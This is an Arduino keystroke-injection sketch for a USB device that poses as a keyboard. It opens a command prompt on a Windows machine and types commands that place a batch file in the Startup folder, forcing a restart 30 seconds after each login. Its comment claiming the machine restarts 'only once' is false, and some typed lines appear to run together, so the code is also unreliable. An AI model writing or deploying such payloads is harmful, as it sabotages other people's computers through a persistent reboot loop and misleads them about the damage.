// DON'T WORRY
// YOUR MACHINE WILL BE RESTARTED ONLY ONCE

// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! TESTED MAN !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

#include <Keyboard.h>
#include <Mouse.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  // Button Code to Disable executing
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
    while(1);
  }
  // Start Keyboard and Mouse
  Mouse.begin();
  Keyboard.begin();

  // Start Payload
  
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  // Shutdown.bat file creation and destination

  Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shutdown.bat\"");

  Keyboard.print("@echo off");

  typeKey(KEY_RETURN);

  // Shutdown after 30sec
  
  Keyboard.print("shutdown /r /t 30");
  
  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  Mouse.end();
}

// Unused
void loop() {}
